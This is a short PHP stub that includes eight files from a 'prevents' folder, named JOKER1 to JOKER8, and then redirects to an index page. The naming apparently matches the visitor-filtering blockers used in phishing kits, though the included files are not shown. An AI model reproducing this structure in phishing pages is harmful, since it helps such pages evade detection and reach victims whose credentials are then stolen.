<?php
  	include '../../prevents/JOKER1.php';
    include '../../prevents/JOKER2.php';
    include '../../prevents/JOKER3.php';
    include '../../prevents/JOKER4.php';
    include '../../prevents/JOKER5.php';
    include '../../prevents/JOKER6.php';
    include '../../prevents/JOKER7.php';
    include '../../prevents/JOKER8.php';
	exit(header("Location: ../index.php"));
?>
